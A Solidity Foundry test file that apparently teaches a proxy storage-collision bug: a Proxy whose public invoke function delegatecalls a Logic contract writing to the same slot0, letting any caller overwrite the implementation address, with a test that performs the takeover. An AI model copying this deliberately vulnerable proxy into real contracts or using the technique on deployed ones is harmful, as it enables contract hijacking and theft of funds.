// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
 
contract ContractTest is Test {
        Logic LogicContract;
        Proxy ProxyContract;

function testStorageCollision() public {

    LogicContract = new Logic();
    ProxyContract = new Proxy(address(LogicContract));

    console.log("Current implementation contract address:",ProxyContract.implementation());
    ProxyContract.invoke(
        abi.encodeWithSignature("foo(address)",address(this)));
    console.log("Overwrited slot0 implementation contract address:",ProxyContract.implementation());
    console.log("Exploit completed");
    }
    receive() payable external{}
}

contract Proxy {
    address public implementation;  //slot0

    constructor (address _implementation) public {
        implementation = _implementation;
    }

    function invoke(bytes memory _calldata) public {
        implementation.delegatecall(_calldata);
    }
}

contract Logic {
    address public GuestAddress; //slot0
    
    constructor () public {
        GuestAddress = address(0x0);
    }

    function foo(address _addr) public {
        GuestAddress = _addr;
    }
}